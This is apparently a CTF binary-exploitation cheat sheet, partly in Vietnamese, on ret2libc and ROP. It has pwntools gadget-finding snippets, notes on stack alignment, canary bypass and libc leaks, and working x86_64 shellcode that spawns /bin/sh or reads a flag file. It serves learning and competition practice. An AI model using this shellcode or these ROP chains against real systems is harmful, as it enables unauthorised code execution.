# Ret2LIBC-ROP

## [0] Overview:
- pwntools '/bin/sh', gadget:
```python
next(libc.search(b'/bin/sh'))

POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]
```
- pwntools `flat()` điền byte là p64() hoặc p32() theo cấu trúc chương trình là x86 hay x86_64, VD:`[convert - ASCIS 2022]` .
- [Tools local find offset LIBC](https://x3ero0.tech/posts/orxw_balsn_ctf_2021_pwn/) .
- Để ý cái lỗi dùng chung stack giữa hai hàm đều được gọi từ hàm main dẫn đến giá trị được tham chiếu của hàm này nếu không đặt lại giá trị thì sẽ mang giá trị được tạo bởi hàm kia.
- Một số bài có thể sử dụng one_gadget kết hợp với đối số của các hàm bị ghi đè khi gọi tới.
- Trong libc.so.6 có mọi gadgets, đôi khi không thể dùng tools để tìm được 1 số gadgets.
    * VD: `syscall ; ret` [dicectf 2023 - bop].
    * gadget push rax;ret
    * jmp rsp
    * ...
```python
import pwn
rop = pwn.ROP(libc, base=<address_overwrite>)
rop.call(rop.find_gadget(["syscall", "ret"]))
print(rop.dump())
```
- Từ Ubuntu 18.04 trở đi, nếu việc thực thi thất bại tại những hàm như buffered_vfprintf() hay do_system() trong những file thực thi 64 bit là do ngay trước câu lệnh ret, đầu vùng nhớ stack được cấp phát 16 bytes cho việc gọi lệnh tại return address nên để thực thi được thì cần chèn thêm 1 ROPgadget "ret" vào trước câu lệnh cần thực thi để bỏ đi 1 stack 8 bytes đầu tiên và thực thi câu lệnh này nằm ở stack ngay sau đó.
```
STACK:
1. địa chỉ lệnh "ret"
2. địa chỉ lệnh "pop rdi, ret"
3. địa chỉ lưu chuỗi 
4. địa chỉ hàm gets

5. địa chỉ lệnh "ret"
6. địa chỉ lệnh "pop rdi, ret"
7. địa chỉ muốn được in (đọc chuỗi)
8. địa chỉ hàm printf 
# leak = printf thì sau printf lại phải dùng ret
9. địa chỉ lệnh "ret"
10. địa chỉ nào đó muốn return về.
```
- Vậy nên để bypass tránh việc ghi đè canary ta chỉ cần nhập chữ cái (+, -, -, /) mà không thuộc format %lu thì phần tử đó sẽ bị skip, không thay đổi. VD: chall `Warmup` - UIT-2022-CTF .
- Leak được LIBC thì có thể leak được địa chỉ thuộc stack thông qua biến environ trong LIBC.
- Có thể leak libc thông qua đọc `/proc/self/maps`
- `Chall pwn07 - whitehat`: Dùng dup2(0, 1) để mở lại stdout, leak giá trị.
- `shellcode`:

```python
...
elf = ELF('./vuln')
context.binary = elf
p = elf.process()
...
context.arch = 'amd64'
shellcode = asm(
    f'''
    xor rdi, rdi
    push rdi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    xor rsi, rsi
    xor rax, rax
    add al, 0x3b
    syscall
    ''')
```
```python
shellcode = pwn.asm(
	pwn.shellcraft.open("./flag.txt") + 
	pwn.shellcraft.read(3, "rsp", 64) + 
	pwn.shellcraft.write(1, "rsp", 64)
).ljust(0x44, b"\x90")
```


## [1] Technique:
- [CTF: No leak - close(fd)](https://blog.idiot.sg/2018-09-03/tokyowesterns-ctf-2018-load-pwn/) .
- [CTF: BlindROP](https://soolidsnake.github.io/2018/07/15/blindx86_64_rop.html) .
- BRUTEFORCE - `TWOSHOT - KMACTF2022`
- ...

